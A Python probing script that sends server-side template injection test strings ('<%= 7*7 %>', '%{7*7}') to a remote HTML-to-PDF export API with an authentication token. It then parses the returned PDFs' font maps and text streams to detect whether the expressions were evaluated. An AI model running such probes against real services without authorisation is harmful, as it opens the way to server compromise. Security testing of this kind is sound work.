import json,subprocess,os,re,zlib,sys
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def gen(html,name):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    try: return c,json.loads(open('/tmp/b',encoding='utf-8',errors='replace').read()).get('url')
    except: return c,None
def fetch(url):
    subprocess.run(['curl','-s','-m','60','-o','/tmp/v.pdf',url])
    return open('/tmp/v.pdf','rb').read()
def extract(data):
    # build ToUnicode cmap: bfchar / bfrange
    cmap={}
    for m in re.finditer(rb'beginbfchar(.*?)endbfchar', data, re.S):
        for pair in re.finditer(rb'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', m.group(1)):
            src=int(pair.group(1),16)
            dst=bytes.fromhex(pair.group(2).decode())
            cmap[src]=dst.decode('utf-16-be',errors='replace')
    for m in re.finditer(rb'beginbfrange(.*?)endbfrange', data, re.S):
        for tri in re.finditer(rb'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', m.group(1)):
            a=int(tri.group(1),16); b=int(tri.group(2),16); c=int(tri.group(3),16)
            for i in range(a,min(b,a+512)+1):
                cmap[i]=chr(c+(i-a))
    # decompress content streams, pull hex strings before Tj
    texts=[]
    for m in re.finditer(rb'stream\r?\n(.*?)endstream', data, re.S):
        try: s=zlib.decompress(m.group(1)).decode('latin-1')
        except: continue
        if 'Tj' not in s: continue
        for t in re.finditer(r'<([0-9A-Fa-f]+)>\s*Tj', s):
            h=t.group(1)
            out=''
            for i in range(0,len(h),4):
                gid=int(h[i:i+4],16)
                out+=cmap.get(gid,'?')
            texts.append(out)
    return texts, len(cmap)
tag='zxt183'
tests=[('literal-49','<p>49</p>'),
       ('ssti-erb','<p><%= 7*7 %></p>'),
       ('ssti-pct','<p>%{7*7}</p>'),
       ('plain-mark','<p>ZXMARK</p>')]
for label,html in tests:
    c,url=gen(html,f"zx-{tag}-{label}")
    if not url: print(f"  {label:12} gen={c}"); continue
    d=fetch(url)
    texts,ncmap=extract(d)
    print(f"  {label:12} pdf={len(d)}B cmap={ncmap} Tj_runs={len(texts)} -> {texts}")
